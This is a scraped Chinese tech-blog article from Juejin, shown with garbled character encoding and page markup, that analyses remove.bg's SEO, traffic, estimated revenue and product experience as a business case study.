itemprop="name" content="å­Ÿå¥AIç¼–ç¨‹"/> <meta itemprop="url" content="https://juejin.cn/user/4212984287073895"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å°éœ€æ±‚åšåˆ°åƒä¸‡ç¾å…ƒ ARRï¼šremove.bg å…¨æ¡ˆæ‹†è§£
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4212984287073895/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å­Ÿå¥AIç¼–ç¨‹
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T05:17:48.000Z" title="Thu Nov 27 2025 05:17:48 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»11åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯å­Ÿå¥ã€‚</p>
<p>ä»Šå¤©å¼€å§‹ï¼Œæˆ‘å°†å¸¦é¢†å¤§å®¶ä¸€èµ·åˆ†æå•†ä¸šã€åˆ†æäº§å“ã€‚</p>
<p>è¿™æ˜¯å•†ä¸šæ´å¯Ÿç³»åˆ—çš„ç¬¬ä¸€ç¯‡ã€‚</p>
<p>ä¸ºä»€ä¹ˆè¦å¼€å¯è¿™ä¸ªç³»åˆ—å‘¢ï¼Ÿ</p>
<p>åœ¨å‡ºæµ·å¤ç›˜ä¸­æˆ‘å†™é“ï¼Œæˆ‘ä»¬å›¢é˜Ÿçš„ä¼˜åŠ¿åœ¨æ•ˆç‡ï¼ŒåŠ£åŠ¿åœ¨å¸‚åœºã€‚</p>
<p>æˆ‘è®¤ä¸ºåˆåˆ›ä¼ä¸šï¼Œéœ€è¦å…³æ³¨çš„é‡ç‚¹å°±æ˜¯å¸‚åœº+æ•ˆç‡ï¼Œè¿™ä¸¤ä¸ªåšå¥½äº†ï¼Œå°±æˆåŠŸäº†ä¸€åŠã€‚</p>
<p>å› æ­¤ï¼Œä»ç°åœ¨å¼€å§‹ï¼Œæˆ‘è‡ªå·±ä¼šæŠ•å…¥ 50%çš„ç²¾åŠ›åœ¨å¸‚åœºç ”ç©¶ã€å•†ä¸šæ´å¯Ÿè¿™é‡Œï¼Œå¸Œæœ›å¸¦å¤´å¼¥è¡¥è¿™å—çš„çŸ­æ¿ã€‚</p>
<p>ä»Šå¤©è·Ÿå¤§å®¶åˆ†äº«çš„è¿™æ¬¾äº§å“æ˜¯ remove.bgï¼Œè¿™ä¹Ÿæ˜¯ AI æ¦œå•å‰ 10 çš„äº§å“ã€‚</p>
<p>è¿™ä¸ªäº§å“æˆ‘è§‰å¾—å¾ˆå€¼å¾—ç ”ç©¶å­¦ä¹ ï¼Œå› ä¸ºå®ƒå…¶å®æ˜¯ä¸€ä¸ªå¾ˆå‚ç›´çš„éœ€æ±‚å¸‚åœºï¼Œä½†æ˜¯ä»¥å°åšå¤§ï¼Œå®ƒèµšçš„é’±ä¸å°‘ã€‚</p>
<h2 data-id="heading-0">01 ä»·å€¼ä¸»å¼ å†™è¿› TDH</h2>
<p>å…ˆåˆ†æä¸€ä¸‹è¿™ä¸ªç«™ç‚¹æ•´ä½“çš„ SEO å’Œæµé‡æƒ…å†µã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fce8dabb78bd4442a32d253e5290bcf7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=QTMD3gYnmnYTIAB3ZWzSXpN7sXo%3D" alt="" loading="lazy"/></p>
<p>æˆ‘è§‰å¾—è¿™ä¸ªç«™ç‚¹é¦–å…ˆå€¼å¾—å­¦ä¹ çš„æ˜¯å®ƒçš„ TDHï¼Œè®©æˆ‘ä»¬ä»”ç»†è§‚æ‘©ä¸€ä¸‹ï¼š</p>
<p>title: Remove Background from Image for Free â€“ remove.bg</p>
<p>Description: Remove image backgrounds automatically in 5 seconds with just one click. Don't spend hours manually picking pixels. Upload your photo now &amp; see the magic.</p>
<p>H1: Remove Image Background</p>
<p>è¿™ä¸ª TDH å¥½åœ¨å“ªå‘¢ï¼Ÿæˆ‘è§‰å¾—é‡è¦çš„æ˜¯åŒ…å«äº†ä»·å€¼ä¸»å¼ ã€‚</p>
<p>ä»·å€¼ä¸»å¼ æ˜¯ç²¾ç›Šç”»å¸ƒå¾ˆé‡è¦çš„ä¸€ç¯ï¼Œåšäº§å“å‰ï¼Œåº”è¯¥å…ˆæƒ³å¥½ä»·å€¼ä¸»å¼ æ˜¯ä»€ä¹ˆã€‚</p>
<p>å®ƒçš„æ ‡é¢˜ï¼Œé¦–å…ˆæè¿°çš„ä¸»åŠŸèƒ½ Remove Backgroundï¼Œç„¶åæŠ›å‡ºäº†ä¸€ä¸ª Free çš„é’©å­ï¼Œå¢åŠ  serp å¸å¼•åŠ›ã€‚</p>
<p>è¿™ä¹Ÿæ˜¯æˆ‘ä»¬æƒ¯ç”¨çš„æŠ€å·§äº†ï¼Œæˆ‘åœ¨ä¼˜åŒ– serp å±•ç°çš„æ—¶å€™ä¹Ÿç»å¸¸ä¼šç”¨è¿™ä¸ªæ‰‹æ®µã€‚</p>
<p>Description åˆ™è¯¦ç»†åœ°åŒ…å«äº†å®ƒçš„ä»·å€¼ä¸»å¼ ï¼š5 second with just one clickã€‚</p>
<p>å¾ˆå¤šäººä¸é‡è§†è¿™ä¸ªï¼Œå¯¼è‡´ä½ çš„ serp æ²¡æœ‰å¸å¼•åŠ›ï¼Œç”¨æˆ·çœ‹åˆ°éƒ½ä¸ä¼šç‚¹å‡»è¿›å»ã€‚</p>
<p>è¿™ä¸ª TDH å°±éå¸¸æœ‰å¸å¼•åŠ›ï¼ŒæŠ“ä½äº†ç”¨æˆ·çš„ç—›ç‚¹ï¼Œè¿™ä¸ªå›¢é˜Ÿä¸€å®šæ˜¯æ·±å…¥è°ƒç ”è¿‡ç”¨æˆ·éœ€æ±‚çš„ã€‚</p>
<p>å®é™…ä¸Šæˆ‘ä»¬ä»…ä»…é€šè¿‡è¿™ä¸ª TDH å°±å·²ç»å¯ä»¥åˆ†æå‡ºç”¨æˆ·éœ€æ±‚äº†ï¼š</p>
<p><strong>æƒ³è¦æ‰¾ä¸€ä¸ªå…è´¹çš„å»é™¤èƒŒæ™¯å›¾çš„å·¥å…·ï¼Œå¿«é€Ÿå¤„ç†å›¾ç‰‡ã€‚</strong></p>
<h2 data-id="heading-1">02 OpenGraph è®©ä¼ æ’­è‡ªå¸¦è½¬åŒ–åŠ›</h2>
<p>é™¤äº† TDH ä¹‹å¤–ï¼Œæˆ‘è§‰å¾—è¿™ä¸ªç«™ç‚¹åœ¨ SEO è¿˜æœ‰ä¸€ç‚¹å€¼å¾—æˆ‘ä»¬å­¦ä¹ çš„å°±æ˜¯ OpenGraphï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0171539408f642ec9c68f72ed13ec4e1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=0lrqMlED6MjCIisHTMgJ0sjSoWw%3D" alt="" loading="lazy"/></p>
<p>OpenGraph æˆ‘ä»¬ä¼šç»å¸¸å¿½ç•¥ï¼Œä½†åœ¨ Twitter è¿™æ ·çš„åª’ä½“å¹³å°ä¼ æ’­æ˜¯ä¸€ä¸ªéå¸¸å…³é”®çš„å› ç´ ã€‚</p>
<p>remove.bg è¿™å¼ å›¾æ˜¯ç²¾å¿ƒè®¾è®¡è¿‡çš„ï¼Œæœ‰ before å’Œ after å¯¹æ¯”ï¼Œåœ¨ç¤¾åª’å¹³å°ä¸Šä½ çœ‹åˆ°è¿™å¼ å›¾ï¼Œä¸€çœ¼å°±èƒ½æ˜ç™½è¿™ä¸ªäº§å“çš„ä»·å€¼ã€‚</p>
<h2 data-id="heading-2">03 æµé‡ç›˜å­ï¼š80M/æœˆçš„æœç´¢ + ç›´è®¿</h2>
<p>èŠå®Œ SEOï¼Œæˆ‘ä»¬çœ‹çœ‹ç«™ç‚¹çš„æµé‡æƒ…å†µã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/af831f8d7bb34b7bb735bc4316bb6640~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=rYezQVFZKTHP%2BQ16x7NZFQqzKew%3D" alt="" loading="lazy"/></p>
<p>è¿™ä¸ªç«™ç‚¹è¿‘ 3 ä¸ªæœˆï¼Œæ¯ä¸ªæœˆå¤§æ¦‚æœ‰å°†è¿‘å…«åƒä¸‡çš„è®¿é—®ï¼Œæ˜¯ä¸€ä¸ªæµé‡æé«˜çš„ç«™ç‚¹ï¼Œæµé‡æ¥æºåŸºæœ¬ä¸Šæ˜¯æœç´¢+ç›´æ¥è®¿é—®ã€‚</p>
<p>ä¸ºä»€ä¹ˆè¿™ä¸ªç«™ç‚¹ç›´æ¥è®¿é—®è¿™ä¹ˆé«˜å‘¢ï¼Ÿæˆ‘è§‰å¾—é¦–å…ˆæ˜¯è¿™ä¸ªåŸŸåæ³¨å†Œå¾—éå¸¸å¥½ã€‚</p>
<p>è¿™æ˜¯ä¸€ä¸ªç”¨æˆ·éœ€æ±‚å…³é”®è¯çš„åŸŸåï¼Œéå¸¸å®¹æ˜“è®°å¿†ï¼Œç”¨æˆ·åœ¨ä½¿ç”¨è¿‡åï¼Œå¯èƒ½å°±ç›´æ¥è®°ä½åŸŸåï¼Œä¸‹æ¬¡å°±ç›´æ¥è¿‡æ¥äº†ã€‚</p>
<p>ç„¶åå†çœ‹å®ƒçš„æœç´¢å…³é”®è¯ï¼Œremove bg è¿™ä¸ªå…³é”®è¯ï¼Œæœˆæœç´¢é‡æ€»æ•°åœ¨ 400 ä¸‡ï¼Œè€Œå®ƒæŠŠè¿™ä¸ªæµé‡å…¨åƒäº†ã€‚</p>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå®ƒåœ¨è¿™ä¸ªå…³é”®è¯ä¸Šå¤„äºç»å¯¹çš„é¢†å…ˆåœ°ä½ï¼Œä¸€ç‚¹æµé‡éƒ½æ²¡æœ‰å»ç«äº‰å¯¹æ‰‹é‚£é‡Œã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4bdc94931e5544eea39b04696ee7b0a1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=r%2Bs7pjDC3DLNxB2X72J%2FWLz7Cmo%3D" alt="" loading="lazy"/></p>
<p>ä» SimilarWeb ä¸Šå¯ä»¥çœ‹åˆ°ï¼Œå®ƒçš„å“ç‰Œè¯å æ¯” 96%ï¼Œè€Œå®ƒçš„å“ç‰Œè¯å°±æ˜¯éœ€æ±‚è¯ï¼ŒåŸºæœ¬ä¸Šåœ¨è¿™ä¸ªè¯ä¸Šå°±æ˜¯å„æ–­äº†ã€‚</p>
<p>å¯¹äº background removerã€remove backgroundï¼Œä¹Ÿæœ‰åŸºæœ¬ä¸Šå…­ä¸ƒåçš„å¸‚åœºå æœ‰ç‡ã€‚</p>
<p>å®ƒçš„æµé‡å¤§å¤´å›½å®¶å¯ä»¥çœ‹åˆ°æ˜¯å°åº¦ã€å·´è¥¿ã€ç¾å›½ç­‰åœ°åŒºã€‚</p>
<p>ä¸€èˆ¬æ¥è¯´æˆ‘ä»¬è®¤ä¸ºæ¥è‡ªå°å·´åœ°åŒºçš„æµé‡æ¯”è¾ƒå»‰ä»·ï¼Œä½†æ˜¯ä»–è¿™ä¸ªé‡çº§éå¸¸å¤§ï¼Œå³ä½¿ cpm å¾ˆä½ä¹Ÿèƒ½èµšå¾ˆå¤šé’±äº†ã€‚</p>
<p>ä¸è¿‡æˆ‘åœ¨è¿™ä¸ªç«™ç‚¹ä¸Šæš‚æ—¶æ²¡æœ‰å‘ç°å¹¿å‘Šçš„ç—•è¿¹ï¼Œåœ¨ SImilarWeb ä¸Šå…¶å®æ˜¯æœ‰çš„ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/76ec47f3c220457c9fd99ee4c11ffc6b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=d68oX3TuTgoGHnSydIBTvXbygPA%3D" alt="" loading="lazy"/></p>
<p>å‡ºç«™æµé‡ç¬¬ä¸€åæ˜¯ googleï¼Œå¤§æ¦‚ç‡æ˜¯ adsense å¹¿å‘Šäº†ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆä»–ä»¬ç°åœ¨å»æ‰äº†å¹¿å‘Šã€‚</p>
<h2 data-id="heading-3">04 èµšå¤šå°‘é’±ï¼Ÿä¿å®ˆä¼°ç®—ä¹Ÿå¾ˆé¦™</h2>
<p>å°±ç®—æŒ‰ç…§æœ€ä½çš„ cpm ä¼°è®¡ï¼Œè¿™ä¸ªç«™çº¯å¹¿å‘Šæ”¶å…¥ä¹Ÿå¯ä»¥æœˆå…¥åä¸‡åˆ€äº†ï¼Œå¹´å…¥ç™¾ä¸‡ç¾é‡‘ã€‚</p>
<p>ç”±äºè¿™ä¸ªç«™ç‚¹æŠŠ checkout é¡µé¢è®¾ç½®ä¸ºä¸ç´¢å¼•ï¼Œæ‰€ä»¥æ²¡æ³•ä¼°è®¡å®ƒçš„è®¢å•é‡ï¼Œä½†å°±ç®—æŒ‰ç…§åƒåˆ†ä¹‹ä¸€çš„è½¬åŒ–ç‡ï¼Œå®ƒçš„å®šä»·ç­–ç•¥æŒ‰$10 æ¥ç®—ï¼Œä¹Ÿæœ‰æ¯ä¸ªæœˆ 80 ä¸‡åˆ€çš„æ”¶ç›Šã€‚</p>
<p>é‚£ä¹ˆåŠ èµ·æ¥ï¼Œremove.bg çš„ ARR åº”è¯¥è‡³å°‘æ˜¯åƒä¸‡ç¾å…ƒçº§åˆ«çš„ã€‚å°±è¿™ä¹ˆä¸ªå°éœ€æ±‚ï¼Œåšåˆ°äº†åƒä¸‡ ARRï¼Œè¿™å°±æ˜¯æµ·å¤–çš„ç”Ÿæ€ã€‚</p>
<p>è¿™ä¸ªåŸŸåçš„ whois æŒ‚äº†ï¼ŒæŸ¥ä¸åˆ°æ˜¯ä»€ä¹ˆæ—¶å€™æ³¨å†Œçš„åŸŸåï¼Œä¸è¿‡å¯ä»¥é€šè¿‡ archive æ¨æ–­ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/93392d33e11248c68b8e546c4e26c9a6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=W1qKNPC54H%2F9IW03mfK7QB44tMc%3D" alt="" loading="lazy"/></p>
<p>å…¶å® 18 å¹´çš„æ—¶å€™ï¼Œè¿™ä¸ªç«™ç‚¹å°±åœ¨å¸ƒå±€äº†ï¼Œä»–ä»¬çš„ç¬¬ä¸€ä¸ªç‰ˆæœ¬å°±æ˜¯ remove bgï¼Œé‚£ä¸ªæ—¶å€™ AI è¿˜æ²¡æœ‰ç«çƒ­ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6c35a3402fba4baaac659eef9487a06e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=IGSDhfxGlGoHBLIO5F%2FmEKRI1OY%3D" alt="" loading="lazy"/></p>
<p>æˆ‘ä»¬çœ‹ä¸€ä¸‹å®ƒçš„ about é¡µï¼Œæœä¸å…¶ç„¶ï¼Œæ˜¯ 2018 å¹´åˆ›ç«‹çš„å›¢é˜Ÿï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/659845676f364a0c9d8751a03042c4a7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=Yey2Y8sHEyzjWj6SbxhU7Ahog1o%3D" alt="" loading="lazy"/></p>
<p>ä»–ä»¬ç«Ÿç„¶æ˜¯ Canva çš„ä¸€ä¸ªå­å›¢é˜Ÿï¼Œä»ç…§ç‰‡ä¸Šæ¥çœ‹å¤§æ¦‚æœ‰ 50 å¤šäººäº†ï¼Œä»åˆåˆ›çš„è§’åº¦æ¥è¯´äººä¹Ÿä¸ç®—å°‘äº†ã€‚</p>
<h2 data-id="heading-4">05 ä¸Šæ‰‹ä½“éªŒï¼šé¦–å±ç›´æ¥æŠŠå·¥å…·å¡ç»™ä½ </h2>
<p>åˆ†æå®Œæµé‡å’Œæ”¶ç›Šï¼Œæˆ‘ä»¬æ¥åˆ†æåˆ†æäº§å“ï¼Œçœ‹çœ‹è¿™ä¸ªäº§å“æœ‰å“ªäº›æ˜¯å€¼å¾—æˆ‘ä»¬å­¦ä¹ çš„ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/468905437afb44899b0498014cb0c1ab~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=sr8riACejFySq7PSNidlQ6eGoDQ%3D" alt="" loading="lazy"/></p>
<p>å…ˆçœ‹å®ƒçš„é¦–å±ï¼Œç›´æ¥æŠŠå·¥å…·æ”¾åœ¨é¦–å±ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œç”¨æˆ·ä¸ç”¨æ»šåŠ¨ï¼Œå°±å¯ä»¥ç›´æ¥ä½“éªŒå·¥å…·ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬æå€¡çš„ã€‚</p>
<p>å¯¹äºå·¥å…·ç±»ç«™ç‚¹æ¥è¯´ï¼Œé¦–é¡µä¸ç”¨ä»€ä¹ˆ Banner å’Œ CTAï¼ŒæŠŠå·¥å…·æ”¾åœ¨é¦–å±ï¼Œè®©ç”¨æˆ·ç¬¬ä¸€æ—¶é—´ä½“éªŒæ˜¯æœ€ä¼˜çš„åšæ³•ã€‚</p>
<p>ä»å®¡ç¾çš„è§’åº¦ï¼Œæˆ‘è§‰å¾—è¿™ä¸ªé¦–å±å¹¶ä¸ç®—éå¸¸ç¾è§‚ï¼Œèƒœåœ¨ç®€æ´ã€‚</p>
<p>å…¶å®è¿™ä¹Ÿè¯´æ˜äº†ï¼Œå·¥å…·ç«™ä¸ä¸€å®šè¦æœ‰å¾ˆæƒŠè‰³çš„è§†è§‰æ•ˆæœï¼Œé‡åœ¨åŠŸèƒ½æ»¡è¶³ç”¨æˆ·éœ€æ±‚ï¼Œè¿™æ˜¯é¦–è¦çš„ã€‚</p>
<p>åœ¨æœªç™»å½•çš„æ—¶å€™å°±æ”¯æŒç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ï¼Œå¹¶æ²¡æœ‰é˜»æ–­ç”¨æˆ·ä½“éªŒï¼Œåœ¨ä¸Šä¼ å›¾ç‰‡ä¹‹åï¼Œè·³è½¬åˆ°äº†ä¸€ä¸ªç¼–è¾‘é¡µï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/be90bf977c17462e931c5b81b68e62f8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=BQiVKHfa3iWtry%2BMo76aKlcck7o%3D" alt="" loading="lazy"/></p>
<p>è¿™ä¹Ÿæ˜¯å·¥å…·ç«™ç‚¹éå¸¸å€¼å¾—å­¦ä¹ çš„æ–¹å¼ï¼Œç›¸å½“äºé¦–é¡µæ˜¯ä¸€ä¸ªé’©å­ï¼Œå…·ä½“å¤æ‚çš„åŠŸèƒ½åœ¨å†…é¡µå®ç°ã€‚</p>
<p>è¿™é‡Œçš„ç¼–è¾‘å™¨åšçš„è¿˜æ˜¯ä¸é”™çš„ï¼Œæä¾›äº†åŸºæœ¬çš„å›¾ç‰‡ç¼–è¾‘åŠŸèƒ½ï¼Œè¿˜èƒ½ä¸€é”®æ¢èƒŒæ™¯ã€‚</p>
<p>å¦‚æœä½ ä»”ç»†ä½“éªŒï¼Œå®ƒè¿˜æœ‰å„ç§æ¶‚åˆ·ä¹‹ç±»çš„åŠŸèƒ½ï¼Œå¯ä»¥è¯´æ˜¯éå¸¸ä¸“ä¸šçš„ï¼Œå¹¶ä¸æ˜¯éšéšä¾¿ä¾¿åšçš„ã€‚</p>
<p>åˆ°è¿™é‡Œä¸ºæ­¢ï¼Œå…¶å®èƒŒæ™¯å·²ç»å»é™¤äº†ï¼Œç›®å‰è¿˜ä¸éœ€è¦ç™»å½•ä»¥åŠä»˜è´¹ã€‚</p>
<p>è¿™ä¹Ÿæ˜¯è·Ÿå®ƒæ ‡æ¦œçš„å…è´¹ä½¿ç”¨æ‰€ç¬¦åˆã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/af71e7620dd9450c8e0ce29ba45078be~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=iiMaCmULkrQAcxITZVV7NcFePUU%3D" alt="" loading="lazy"/></p>
<p>åœ¨ä¸‹è½½çš„æ—¶å€™ï¼Œä¹Ÿç»™äº†ä¸€ä¸ªå…è´¹é€‰é¡¹ï¼Œè€Œä¸”ä¸‹è½½æ˜¯å®Œå…¨æ²¡æœ‰æ°´å°çš„ï¼Œç›¸å½“äºå…è´¹å°±å¯ä»¥å®Œæˆæ•´ä¸ªé—­ç¯ã€‚</p>
<p>æˆ‘è¯•äº†ä¸€ä¸‹ï¼Œå†ä¸Šä¼ ä¸€å¼ å›¾ç‰‡ï¼Œè¿™æ¡è·¯å¾„è¿˜å¯ä»¥ç»§ç»­èµ°ï¼Œæ²¡æœ‰é™åˆ¶ã€‚</p>
<p>ä¸è¿‡è¿™ä¹Ÿåªèƒ½æ˜¯å¤§å‚ç©æ³•äº†ï¼Œå¯¹äºæˆ‘ä»¬ä¸ªäººæ¥è¯´ï¼Œå¦‚æœè¿™ä¹ˆå¹²ï¼Œæˆæœ¬è‚¯å®šæ‰›ä¸ä½ã€‚</p>
<h2 data-id="heading-5">06 ä»˜è´¹è§¦å‘ &amp; å®šä»·è®¾è®¡</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/97f3834bac654d6aa06191cf6e3c6177~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=YM5KmMT9B%2Bw092JuY1cv38AkDH4%3D" alt="" loading="lazy"/></p>
